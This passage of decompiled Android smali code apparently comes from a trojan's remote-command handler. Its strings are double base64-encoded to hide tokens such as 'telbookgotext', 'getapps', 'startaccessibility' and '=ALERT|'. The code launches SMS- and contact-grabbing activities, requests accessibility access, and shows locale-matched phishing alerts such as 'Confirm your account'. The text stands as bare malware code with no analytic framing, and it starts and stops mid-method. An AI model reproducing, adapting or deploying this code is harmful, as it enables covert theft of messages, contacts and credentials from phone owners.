    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v5, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_9a9

    new-instance v5, Landroid/content/Intent;

    const-class v11, Lnaqsl/ebxcb/exu/Activity/ActivityGetSMS;

    invoke-direct {v5, v0, v11}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v5, v10}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v5, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, v5}, Landroid/app/IntentService;->startActivity(Landroid/content/Intent;)V

    :cond_9a9
    aget-object v5, v2, v3

    const-string v11, "ZkhSbGJHSnZiMnRuYjNSbGVIUTk="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v5, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_a09

    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    aget-object v11, v2, v3

    const-string v12, "ZkhSbGJHSnZiMnRuYjNSbGVIUTk="

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    const-string v13, "ZkdWdVpIUmxlSFJpYjI5cg=="

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v5, v11, v12, v13}, Lnaqsl/ebxcb/exu/int;->fddo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    new-instance v11, Landroid/content/Intent;

    const-class v12, Lnaqsl/ebxcb/exu/Activity/ActivityGetNumber;

    invoke-direct {v11, v0, v12}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v11, v12, v13}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v11

    const-string v12, "WTNkalgzUmxlSFE9"

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    invoke-virtual {v5, v10}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v5, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, v5}, Landroid/app/IntentService;->startActivity(Landroid/content/Intent;)V

    :cond_a09
    aget-object v5, v2, v3

    const-string v11, "WjJWMFlYQndjdz09"

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v5, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_a20

    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {v5, v0}, Lnaqsl/ebxcb/exu/int;->case(Landroid/content/Context;)V

    :cond_a20
    aget-object v5, v2, v3

    const-string v11, "WjJWMGNHVnliV2x6YzJsdmJuTT0="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v5, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_a37

    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {v5, v0}, Lnaqsl/ebxcb/exu/int;->else(Landroid/content/Context;)V

    :cond_a37
    aget-object v5, v2, v3

    const-string v11, "YzNSaGNuUmhZMk5sYzNOcFltbHNhWFI1"

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v5, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    const-string v11, "YzNSaGNuUlNaWEYxWlhOMA=="

    if-eqz v5, :cond_a90

    :try_start_a4b
    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v5, v0, v12}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v12, "UVdOalpYTnpQVEE9"

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v5, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v12

    if-eqz v12, :cond_a90

    const-string v12, "UVdOalpYTnpQVEE9"

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    const-string v13, "UVdOalpYTnpQVEU9"

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v5, v12, v13}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    iget-object v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v0, v13, v5}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_a8e
    .catch Ljava/lang/Exception; {:try_start_a4b .. :try_end_a8e} :catch_a8f

    goto :goto_a90

    :catch_a8f
    nop

    :cond_a90
    :goto_a90
    aget-object v5, v2, v3

    const-string v12, "YzNSaGNuUndaWEp0YVhOemFXOXU="

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v5, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_b0f

    :try_start_aa2
    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v5, v0, v12}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v13, "UlZKU1QxST0="

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    new-instance v14, Ljava/lang/StringBuilder;

    invoke-direct {v14}, Ljava/lang/StringBuilder;-><init>()V

    const-string v15, "ZEdocGN5QjNZWE1nTVRKNElITjBZWEowVW1WeGRXVnpkQ0E9"

    invoke-static {v15}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    invoke-static {v15}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v14, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v14, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v12, v13, v14}, Lnaqsl/ebxcb/exu/int;->fddo(Ljava/lang/String;Ljava/lang/String;)V

    const-string v12, "VUdWeWJUMHc="

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v5, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v12

    if-eqz v12, :cond_b0f

    const-string v12, "VUdWeWJUMHc="

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    const-string v13, "VUdWeWJUMHg="

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v5, v12, v13}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    iget-object v12, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v12, v0, v11, v5}, Lnaqsl/ebxcb/exu/int;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_b0d
    .catch Ljava/lang/Exception; {:try_start_aa2 .. :try_end_b0d} :catch_b0e

    goto :goto_b0f

    :catch_b0e
    nop

    :cond_b0f
    :goto_b0f
    aget-object v5, v2, v3

    const-string v11, "UFVGTVJWSlVmQT09"

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v5, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_b7c

    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    aget-object v11, v2, v3

    const-string v12, "ZkhScGRHeGxQUT09"

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static/range {v19 .. v19}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v5, v11, v12, v13}, Lnaqsl/ebxcb/exu/int;->fddo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    aget-object v11, v2, v3

    const-string v12, "ZEdWNGREMD0="

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v11

    :try_start_b4b
    new-instance v12, Landroid/content/Intent;

    const-class v13, Lnaqsl/ebxcb/exu/Activity/ActivityAlert1;

    invoke-direct {v12, v0, v13}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v13, "ZEdsMGJHVT0="

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    const-string v12, "WTI5dWRHVnVkQT09"

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    const/4 v13, 0x1

    aget-object v11, v11, v13

    invoke-virtual {v5, v12, v11}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    invoke-virtual {v5, v10}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v5, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, v5}, Landroid/app/IntentService;->startActivity(Landroid/content/Intent;)V
    :try_end_b7a
    .catch Ljava/lang/Exception; {:try_start_b4b .. :try_end_b7a} :catch_b7b

    goto :goto_b7c

    :catch_b7b
    nop

    :cond_b7c
    :goto_b7c
    aget-object v5, v2, v3

    const-string v11, "UFZCVlUwaDg="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v5, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_c22

    :try_start_b8e
    const-string v5, "UlZKU1QxST0="

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v11, "WkdGMFlTQmpiMjFwYm1jZ2NIVnphQ0J2YXc9PQ=="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v5, v11}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    aget-object v11, v2, v3

    const-string v12, "ZkhScGRHeGxQUT09"

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static/range {v19 .. v19}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v5, v11, v12, v13}, Lnaqsl/ebxcb/exu/int;->fddo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v11, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    aget-object v12, v2, v3

    invoke-static/range {v19 .. v19}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    const-string v14, "ZkdsamIyNDk="

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v11, v12, v13, v14}, Lnaqsl/ebxcb/exu/int;->fddo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    aget-object v12, v2, v3

    const-string v13, "YVdOdmJqMD0="

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v12

    const/4 v13, 0x1

    aget-object v12, v12, v13

    new-instance v13, Landroid/content/Intent;

    const-class v14, Lnaqsl/ebxcb/exu/ServiceModuleNotification;

    invoke-direct {v13, v0, v14}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v14, "WVhCd2JtRnRaUT09"

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-static {v14}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14, v12}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v12

    const-string v13, "ZEdsMGJHVT0="

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    const-string v12, "ZEdWNGRBPT0="

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v5, v12, v11}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v5

    invoke-virtual {v0, v5}, Landroid/app/IntentService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_c20
    .catch Ljava/lang/Exception; {:try_start_b8e .. :try_end_c20} :catch_c21

    goto :goto_c22

    :catch_c21
    nop

    :cond_c22
    :goto_c22
    aget-object v5, v2, v3

    const-string v11, "YzNSaGNuUkJkWFJ2VUhWemFBPT0="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v5, v11}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_d76

    :try_start_c34
    iget-object v5, v0, Lnaqsl/ebxcb/exu/ServiceCommands;->ifdf:Lnaqsl/ebxcb/exu/int;

    aget-object v11, v2, v3

    const-string v12, "ZkVGd2NFNWhiV1U5"

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    const-string v13, "ZkVWdVpFRndjRTVoYldVPQ=="

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-static {v13}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v5, v11, v12, v13}, Lnaqsl/ebxcb/exu/int;->fddo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {}, Landroid/content/res/Resources;->getSystem()Landroid/content/res/Resources;

    move-result-object v11

    invoke-virtual {v11}, Landroid/content/res/Resources;->getConfiguration()Landroid/content/res/Configuration;

    move-result-object v11

    iget-object v11, v11, Landroid/content/res/Configuration;->locale:Ljava/util/Locale;

    invoke-virtual {v11}, Ljava/util/Locale;->toString()Ljava/lang/String;

    move-result-object v11

    const-string v12, "VWxVPQ=="

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v12

    if-eqz v12, :cond_c84

    const-string v11, "MEtIUmdOQyswWWZRdmRDKzBMVWcwWUhRdnRDKzBMSFJpZEMxMEwzUXVOQzFJUT09"

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    const-string v12, "MEovUXZ0QzAwWUxRc3RDMTBZRFF0TkM0MFlMUXRTRFJnZEN5MEw3UXVTRFFzTkM2MExyUXNOR0QwTDNSZ2c9PQ=="

    :goto_c7a
    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    goto/16 :goto_d42

    :cond_c84
    const-string v12, "VlZNPQ=="

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v12

    if-eqz v12, :cond_ca1

    const-string v11, "VlhKblpXNTBJRzFsYzNOaFoyVWg="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    const-string v12, "UTI5dVptbHliU0I1YjNWeUlHRmpZMjkxYm5RPQ=="

    goto :goto_c7a

    :cond_ca1
    const-string v12, "VkZJPQ=="

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v12

    if-eqz v12, :cond_cbe

    const-string v11, "UjhPY1ZrVk9UTVN3U3lCQ3hMQlN4TEJOeExBPQ=="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    const-string v12, "VTJGNXhMRnVJRzNEdk1XZmRHVnlhVzFwZWlCc3c3eDBabVZ1SUdobGMyRml4TEZ1eExGNnhMRWdiMjVoZVd4aGVjU3hiaUJoYTNOcElIUmhhMlJwY21SbElHSnNiMnRsSUdWa2FXeGxZMlZyZEdseUxnPT0="

    goto :goto_c7a

    :cond_cbe
    const-string v12, "UkVVPQ=="

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v12

    if-eqz v12, :cond_cdb

    const-string v11, "UkhKcGJtZGxibVJsSUU1aFkyaHlhV05vZENFPQ=="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    const-string v12, "UW1WemRNT2tkR2xuWlc0Z1UybGxJR2xvY2lCTGIyNTBidz09"

    goto :goto_c7a

    :cond_cdb
    const-string v12, "U1ZRPQ=="

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v12

    if-eqz v12, :cond_cf8

    const-string v11, "VFdWemMyRm5aMmx2SUhWeVoyVnVkR1Vo"

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    const-string v12, "UTI5dVptVnliV0VnYVd3Z2RIVnZJR0ZqWTI5MWJuUT0="

    goto :goto_c7a

    :cond_cf8
    const-string v12, "UmxJPQ=="

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v12

    if-eqz v12, :cond_d16

    const-string v11, "VFdWemMyRm5aU0IxY21kbGJuUWg="

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

